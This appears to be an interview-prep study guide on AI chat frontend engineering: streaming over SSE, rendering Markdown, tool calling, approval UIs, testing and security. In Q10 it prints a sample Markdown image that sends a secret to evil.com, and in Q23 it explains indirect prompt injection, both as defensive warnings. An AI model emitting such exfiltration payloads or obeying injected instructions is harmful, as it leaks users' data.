# 02 · AI frontend engineering (the core of the role)

This is the file that separates you from a generic React candidate. Deep notes with code:
[`fe-hands-on/whetstone/14-ai-frontend/`](../../fe-hands-on/whetstone/14-ai-frontend/README.md) and
[`devrev-fde/modules/09-frontend-ai-ui.md`](../devrev-fde/modules/09-frontend-ai-ui.md). Your own working build:
[`fe-hands-on/`](../../fe-hands-on/README.md) (Go SSE server → Next.js console, events `{sources} {token}* {done}`).

---

## A. Streaming transport

### Q1 🟢 How do you stream an LLM response to the browser? What are the options?
**A.** Three transports:
| Option | Direction | Good for | Catch |
|---|---|---|---|
| **SSE over `fetch` + `ReadableStream`** | Server → client over one HTTP response | Chat answers (the default choice) | You parse the `text/event-stream` format yourself |
| **`EventSource`** (native SSE client) | Server → client | Simple GET feeds | **GET only, no request body, custom headers not supported** → can't POST a prompt or send an `Authorization` header |
| **WebSocket** | Both ways | Voice, collaborative/multi-user, server-initiated pushes into an open session | Separate protocol, harder through proxies, you build reconnect and backpressure |
For chat I use `fetch` POST with the prompt in the body, read `response.body` as a stream, decode with `TextDecoder`, split on blank lines (`\n\n`), and parse `data:` lines. It's plain HTTP, so auth, CORS, and HTTP/2 multiplexing all work normally.

### Q2 🟡 Walk me through the control flow and data flow of a streamed chat message, click to last token.
**A.**
1. User hits send → reducer adds the user message and an **empty assistant message with status `streaming`**, both with client IDs. Input clears and focus stays in the composer.
2. Create an `AbortController`, store it per message.
3. `fetch('/api/chat', { method: 'POST', body, signal })`. The server (BFF) authenticates, builds the prompt server-side, calls the model with streaming on.
4. Server forwards events: e.g. `sources` (retrieved citations) first, then many `token` deltas, then `done` with usage + stop reason, or `error`.
5. Client loop: `reader.read()` → decode bytes (with `{ stream: true }` so multi-byte characters split across chunks decode correctly) → buffer → split complete events → dispatch.
6. **Batch** dispatches: accumulate deltas in a ref and flush once per animation frame (`requestAnimationFrame`), not one React update per token.
7. On `done`: status `complete`, store usage, enable feedback buttons, announce "response complete" to screen readers.
8. On abort/error: keep the partial text, mark `stopped` or `error`, offer Retry.
Data flow is one way: network → parser → reducer → render. The UI never mutates message text directly.

### Q3 🟡 What's tricky about parsing SSE from a fetch stream?
**A.**
- A network chunk is not an event. One chunk can hold half an event or three events. **Buffer** and only process up to the last `\n\n`.
- A chunk can end in the middle of a multi-byte UTF-8 character: use one `TextDecoder` instance with `{ stream: true }` (or `TextDecoderStream`).
- An event can have several `data:` lines; join them with `\n`. Lines starting with `:` are comments (often heartbeats/keep-alives).
- Line endings can be `\n`, `\r\n`, or `\r` per the spec; normalise.
- At end of stream: the SSE spec discards an event that wasn't terminated by a blank line; some clients flush it leniently. Pick one and test it.
- Proxies (nginx, some CDNs) can **buffer** the response and kill the streaming effect. Server sets `Content-Type: text/event-stream`, `Cache-Control: no-cache`, and disables proxy buffering (for nginx, the `X-Accel-Buffering: no` response header). Also, compression middleware can buffer; check it.
See the full parser in [06-coding-rounds.md](06-coding-rounds.md#c1-sse-parser-over-fetch).

### Q4 🟡 How do you implement "Stop generating"?
**A.** `AbortController` per request: `controller.abort()` → `fetch` rejects with an `AbortError` / the reader rejects. Client side:
- Distinguish abort from failure: `if (err.name === 'AbortError')` → status `stopped`, keep partial text, no error toast.
- Abort on unmount, on route change, and when a new message replaces an in-flight one.
Server side, which people forget: the server must notice the client disconnected (request context cancelled) and **cancel the upstream model call**, or you keep paying for tokens nobody reads. In my Go server that's the request `context` passed through to the provider call.

### Q5 🔴 The stream drops halfway on a mobile network. What do you do?
**A.** Options in order of complexity:
1. **Show partial + Retry**: simplest; regenerate the whole answer. Fine for most chat.
2. **Resumable streams:** the server writes the generation to a store keyed by message ID as it produces it (generation runs independent of the HTTP connection). The client reconnects with the message ID and the last event ID it saw, and the server replays from there. SSE has `id:` and `Last-Event-ID` for exactly this. Costs: a store (e.g. Redis stream), cleanup, and the generation keeps running if the user leaves — decide whether that's a feature (long agent runs) or waste.
3. For long agent tasks, don't stream over one request at all: start a **job**, return a job ID, and subscribe to progress (SSE/WebSocket) that can reconnect any time; the job state lives server-side.
Senior point: choose by task length. A 10-second answer doesn't need resumability; a 10-minute agent run does.

### Q6 🟡 Why not just use WebSockets for chat?
**A.** For single-user request→streamed-response, SSE-over-fetch is simpler: stateless HTTP, standard auth and rate-limiting at the gateway, works with serverless/edge functions that may not hold sockets, HTTP/2 multiplexing removes the old six-connections-per-domain limit. WebSockets win when the server must push unprompted into a live session (multi-user collaboration, voice/realtime audio, agent asking the user something mid-run in a long-lived session). I'd pick WebSocket for a realtime voice agent, SSE for chat.

### Q7 🟡 What are the server/BFF responsibilities in an AI chat feature?
**A.** The browser never talks to the model provider directly (API keys would be exposed). The BFF (backend-for-frontend):
auth and per-user rate limits, prompt construction from a versioned template, retrieval, tool execution, output moderation if needed,
streaming proxy with disconnect → cancel, logging trace ID + prompt version + model + token usage, and cost metering.
The client sends only the user's message, conversation ID, and UI context (e.g. current page, selected item IDs) — never a raw prompt it built.

---

## B. Rendering streamed output

### Q8 🟡 Rendering a token stream re-renders the message dozens of times per second. How do you keep it smooth?
**A.**
1. **Batch updates per animation frame** (accumulate in a ref, flush in `requestAnimationFrame`). React 18+ automatic batching helps, but tokens arrive in separate tasks, so explicit coalescing still matters.
2. **Isolate the streaming message:** only the last message component subscribes to the changing text. Older messages are memoised and don't re-render.
3. **Incremental Markdown:** re-parse only the last block (split by blank lines / closed code fences); completed blocks are memoised by content.
4. **Virtualise long histories** (only render visible messages), but be careful: variable-height rows + streaming growth + scroll anchoring is hard; for under a few hundred messages, `content-visibility: auto` on old messages may be enough.
5. Avoid layout thrash from reading `scrollHeight` on every token; check "is user at bottom" on scroll events, not on every render.
Measure with the React Profiler and INP; don't guess.

### Q9 🟡 How do you handle auto-scroll while streaming?
**A.** "Stick to bottom" only **if the user was already at the bottom** (within a threshold). If they scrolled up to read, don't yank them down. Show a "↓ New content" / "Jump to latest" button instead. Implementation: track `isAtBottom` on scroll; after each flush, if `isAtBottom`, scroll the sentinel into view. CSS `overflow-anchor` helps with content growing *above* the viewport. Respect `prefers-reduced-motion` (no smooth scroll).

### Q10 🔴 How do you render streaming Markdown safely?
**A.** Two separate problems.
**Partial syntax:** mid-stream you have an unclosed ``` fence, half a table, `**bold` without the closing `**`. Approaches: parse the whole buffer each frame with a tolerant parser (simple, cost grows with length), or split into completed blocks (memoised) + one live tail block; for an open code fence, render it as an open code block until it closes.
**Safety:** model output is untrusted (prompt injection can make it emit anything).
- Never `dangerouslySetInnerHTML` raw model output. Use a Markdown → React renderer that does **not** allow raw HTML, or sanitise with DOMPurify if you must produce HTML.
- Link policy: allow `http(s)` and `mailto` only (block `javascript:` and `data:`), add `rel="noopener noreferrer"`, consider an interstitial for external domains.
- Images: don't auto-load arbitrary model-supplied image URLs. `![](https://evil.com/?q=<secret>)` exfiltrates data the moment the browser fetches it. Allowlist domains or proxy them.
- Code blocks: syntax highlight lazily (load the highlighter in chunks, highlight once the block is closed), with a copy button.
- Defence in depth: a strict CSP (Content-Security-Policy) so even an XSS bug can't run inline script or call arbitrary hosts.

### Q11 🟡 How do you render citations?
**A.** The server sends a `sources` event (id, title, URL, snippet, maybe score) **before** tokens, and the model is instructed to reference sources as `[1]`, `[2]`. The renderer turns markers into accessible links/buttons that open the snippet (popover or side panel). Rules:
- Only link markers that match a sent source ID; drop or flag invented ones (that itself is a quality signal to log).
- Show the source list even if the model didn't cite, so users can check.
- Sources are filtered by the user's permissions **server-side before retrieval results reach the model**, never filtered in the UI.

---

## C. Tool calling and generative UI

### Q12 🟡 What is tool calling (function calling) and how does it reach the UI?
**A.** You describe tools to the model (name, description, JSON-schema parameters). The model may answer with a tool-call request instead of text. Your server executes the tool, sends the result back to the model, and the model continues. This can loop several times (that's an agent loop).
For the UI, the stream now carries more event types: `text-delta`, `tool-call-start` (name, partial args), `tool-call-args-delta`, `tool-result`, `error`, `done`. The message model changes from "a string" to **an ordered list of parts**: text part, tool-call part (with status pending/running/success/error), and so on. The Vercel AI SDK uses this "message parts" shape in recent versions (verify current API in their docs; it changed between major versions).

### Q13 🔴 What is generative UI, and how do you build it safely?
**A.** Instead of only text, the model's structured output picks **a component to render with props**: a chart, a flight card, a form, a table.
Safe design:
1. **Component registry**: the model can only choose from known component names (`{ type: 'weather_card', props }`). Unknown type → fallback to text/JSON view.
2. **Validate props** with a schema (Zod) per component before rendering. Invalid → show a degraded view and log it.
3. Components are **pure presentational + typed callbacks**. Any action inside (a "Book" button) calls your API, never runs model-supplied code.
4. Never `eval` model output, and never render model-generated HTML/JSX strings.
5. Version the registry: old conversations may reference components that changed; keep renderers backward compatible or render a fallback.
Server-driven variant: the server streams already-rendered React Server Components. Faster to build in Next.js but couples you to the framework (verify the current state of the AI SDK RSC APIs; at one point they were marked experimental).

### Q14 🔴 Design the approval (human-in-the-loop) UI for an agent that can take actions.
**A.** Classify tools by risk:
| Class | Example | UI |
|---|---|---|
| Read-only | search docs, list clusters | Run automatically, show "Used: search_docs" collapsed |
| Reversible write | create draft, add label | Auto or one-click, with Undo |
| Irreversible / costly / external | delete cluster, send email, pay | **Explicit confirm card**: what, on which resource, consequences, diff/preview; Approve / Edit / Reject |
Mechanics: the server **pauses** the run at the tool call and persists state (pending approval). The UI renders the card from the tool-call part. Approve sends a decision (with the exact args shown, or a hash of them) back; the server re-validates permissions and args server-side and resumes. Reject sends a reason to the model so it can adapt.
Never trust "approved" from the client alone for authorisation: the server checks the user can do this action. Log who approved what, when. Timeouts: pending approvals expire.
Accessibility: focus moves to the approval card, it's announced, buttons are clearly labelled with the action ("Delete cluster prod-eu-1"), not "OK".

### Q15 🟡 How do you show multi-step agent progress without overwhelming the user?
**A.** A step timeline: each tool call is a collapsible row with a short human label ("Searching docs for 'XDCR lag'… found 4"), status icon, duration. Final answer at the top or bottom, steps collapsed by default after completion. Show a live current-step line during the run. Always a Stop button. For long runs, show elapsed time and let the user leave and come back (job model, notification on completion).

---

## D. Chat state and data model

### Q16 🟡 How do you model chat state on the client?
**A.**
```ts
type Part =
  | { kind: 'text'; text: string }
  | { kind: 'tool'; id: string; name: string; args: unknown; status: 'pending' | 'awaiting_approval' | 'running' | 'done' | 'error'; result?: unknown }
  | { kind: 'sources'; items: Source[] };

type Message = {
  id: string;               // client id, later mapped to server id
  role: 'user' | 'assistant';
  parts: Part[];
  status: 'sending' | 'streaming' | 'complete' | 'stopped' | 'error';
  createdAt: number;
  meta?: { model?: string; promptVersion?: string; traceId?: string; usage?: { input: number; output: number } };
};
```
A `useReducer` (or a small store) with explicit events (`SEND`, `DELTA`, `TOOL_UPDATE`, `DONE`, `ERROR`, `ABORT`) is easy to unit test without a network — which is exactly how my Agent Console's `reducer.test.ts` works.
**Server state vs UI state:** conversation list and history = server state (TanStack Query or RSC); the in-flight stream = local client state; draft text = local + persisted to `localStorage`/IndexedDB so a reload doesn't lose it.

### Q17 🟡 Edit-and-resend and regenerate: how do you model them?
**A.** Conversations become a **tree**, not a list: editing message 3 creates a sibling branch from message 2. Store `parentId` on each message; the UI shows the active path and "< 2/3 >" branch switchers. Regenerate = new sibling assistant message under the same user message. The request sends the active path only. Simpler alternative if the product doesn't need branches: truncate after the edited message (say this trade-off out loud).

### Q18 🟡 Optimistic UI in chat — what's optimistic and what isn't?
**A.** The user's own message is optimistic (render immediately, mark "sending", retry on failure without losing text). The assistant response can't be optimistic — but a skeleton/typing indicator and early `sources` event make it feel instant. For agent actions, **never show an irreversible action as done before the server confirms**. For reversible ones (rename, label), optimistic with rollback is fine. React 19 `useOptimistic` fits the user-message case.

### Q19 🟡 How do you persist and sync conversations across tabs/devices?
**A.** Server is the source of truth (conversation + messages table). Client caches with TanStack Query; invalidate on `done`. Cross-tab: `BroadcastChannel` to tell other tabs a conversation changed. An in-flight stream belongs to one tab; other tabs see "generating…" via polling or a subscription only if the product needs it. Drafts in IndexedDB per conversation ID.

---

## E. Latency and perceived performance

### Q20 🟡 The AI answer takes 6 seconds. How do you make it feel fast?
**A.**
1. **Stream** — the largest win (time to first token instead of total).
2. **Show progress stages** with real events: "Searching docs… → Reading 4 sources… → Writing answer". Send `sources` early.
3. **Skeleton/typing indicator** within ~100 ms of the click so the click feels acknowledged.
4. **Reduce actual TTFT**: smaller model for easy questions (routing), prompt caching, fewer retrieved chunks, parallel retrieval, pre-warm connection (`preconnect` to the API origin).
5. **Prefetch/precompute** where predictable: suggested questions computed with the page, summaries cached.
6. **Don't block the page**: the AI panel loads lazily and fails in isolation.
Measure: TTFT from click (client RUM), p95, abandonment rate (stopped before done).

### Q21 🟡 How would you build AI autocomplete (inline suggestions) in an editor?
**A.** Debounce typing (~150–300 ms, tune it), cancel the previous request on each keystroke (`AbortController`), send a bounded context window around the cursor, use a small fast model, cache by prefix, show as ghost text, Tab to accept / Esc to dismiss, never block typing. Drop stale responses with a request sequence number (latest-wins). Track acceptance rate as the main quality metric. Rate-limit per user.

### Q22 🟡 Which Web Vitals does an AI chat page hurt and how do you protect them?
**A.** **INP** (Interaction to Next Paint, responsiveness): heavy Markdown parsing and syntax highlighting on the main thread during streaming → batch per frame, highlight only closed blocks, move parsing to a Web Worker if needed, use `startTransition` for non-urgent updates. **CLS** (layout shift): content growing above the viewport, citations popping in → reserve space, anchor scroll. **LCP**: the chat shell should render server-side; don't make LCP depend on the AI call. Bundle: lazy-load the Markdown renderer, highlighter languages, and chart libs.

---

## F. Security, privacy, and abuse (FE view)

### Q23 🔴 What is prompt injection and what can the frontend do about it?
**A.** Instructions hidden in content the model reads (a webpage, a document, an email, a tool result) that hijack its behaviour. **Indirect** injection (via retrieved/tool content) is the dangerous one for agents. The FE can't stop the model being fooled; it can limit the damage:
- Treat output as untrusted: no raw HTML, link/image allowlists (stop exfiltration through URLs).
- Human confirmation for consequential actions, showing the **real args**, not the model's summary of them.
- Show which sources/tools influenced an answer.
- Server side (say it, even in an FE interview): least-privilege tools, permission checks per call with the *user's* identity, separate trusted instructions from untrusted data in the prompt, output filtering.
Never say "we sanitize the prompt, so we're safe". There's no complete fix today; it's defence in depth.

### Q24 🟡 How do you handle PII and sensitive data in an AI feature?
**A.** Tell users what is sent and stored. Mask secrets in the composer if detectable (API keys, card numbers) with a warning before send. Don't log full prompts to client-side analytics; server-side logging with retention limits and redaction. Respect tenant data boundaries in retrieval. Check the provider's data retention/training terms and region (enterprise customers ask). Provide delete-conversation that really deletes.

### Q25 🟡 How do you prevent abuse and runaway cost from the client?
**A.** The client can't enforce anything; it can cooperate. Server: per-user and per-tenant rate limits and token budgets, max input length, max tool-loop iterations, timeouts. Client: disable send while streaming (or queue), input length counter, show remaining quota, friendly 429 handling with `Retry-After`. Bot protection at the edge.

---

## G. Accessibility of AI UIs

### Q26 🟡 How do you make a streaming chat accessible?
**A.**
- Message list as a `role="log"` (an implicit polite live region) — but **don't announce every token**: that's unusable with a screen reader. Announce "Assistant is responding" at start and the full answer (or "Response complete") at the end; let users navigate to read it.
- Keyboard: Enter to send, Shift+Enter newline, Esc to stop generating, focus stays in the composer after send, visible focus everywhere.
- Each message has a heading or label (role + time) for navigation.
- Tool approval cards take focus and use specific button labels.
- Code blocks: copy button with an accessible label and a "Copied" announcement.
- Respect `prefers-reduced-motion` for typing animations.
- Don't rely on colour alone for statuses.

---

## H. Testing AI frontends

### Q27 🟡 How do you test a streaming chat UI when the model is non-deterministic?
**A.** Don't test the model in UI tests. Split:
1. **Pure units:** SSE parser (chunk boundaries, multi-byte splits, multi-line data, comments), reducer (event sequences → state), Markdown sanitiser (malicious inputs).
2. **Component tests** with **MSW** (Mock Service Worker, intercepts requests at the network layer) returning a scripted `ReadableStream`: assert progressive rendering, stop, error mid-stream, retry, tool approval flow.
3. **E2E (Playwright)** against a **fake provider** (my Go server has `PROVIDER=fake`): deterministic tokens, deterministic timing.
4. **Model quality** is a separate pipeline: offline evals on a golden set (promptfoo in my repo), not UI tests.
5. Visual regression on the rendered Markdown kinds (tables, code, lists).

### Q28 🔴 How do you know an AI feature is working in production?
**A.** Per-response telemetry tied to a trace ID: model, prompt version, latency (TTFT, total), token usage, stop reason, tool calls, errors. User signals: thumbs up/down with optional reason, copy, regenerate, stop-early, edit-and-resend (implicit "bad answer"), follow-up rephrasing. Sample responses for offline grading (LLM-as-judge + human spot checks). Dashboards per prompt version so a rollout regression shows up. Feed bad cases back into the golden set. Roll out prompt/model changes behind feature flags with a canary. See [03-rag-agents-evals.md](03-rag-agents-evals.md#d-evals-and-observability).

---

## I. Libraries and protocols you should be able to discuss (verify versions before the interview)

| Thing | One line | Say this |
|---|---|---|
| **Vercel AI SDK** (`ai`, `@ai-sdk/react`) | Provider-agnostic streaming, `useChat`, tool calls, message parts | "Great for speed; I'd still own the message model and parser semantics so I can debug it." The API changed noticeably between major versions — check the current docs |
| **TanStack Query** | Server-state caching | Conversation list/history, not the live stream |
| **react-markdown + remark/rehype** | Markdown → React without raw HTML by default | Pair with a sanitiser if you enable HTML |
| **DOMPurify** | HTML sanitiser | Only if you must render HTML |
| **Zod** | Runtime schema validation | Tool args, generative-UI props, structured output |
| **MCP** (Model Context Protocol) | Open protocol for connecting models/agents to tools and data | Transports: stdio and Streamable HTTP (verify current spec at modelcontextprotocol.io) |
| **AG-UI** (from CopilotKit) | An event protocol between agent backends and frontends | Know it exists; don't claim deep experience unless you have it |
| **CopilotKit / assistant-ui** | Prebuilt React chat/copilot components | Build vs buy discussion |
| **OpenAI Apps SDK / MCP-based UI in chat hosts** | Embedding app UIs inside chat clients | Fast-moving in 2025–26; mention only as "I've read about it", verify |
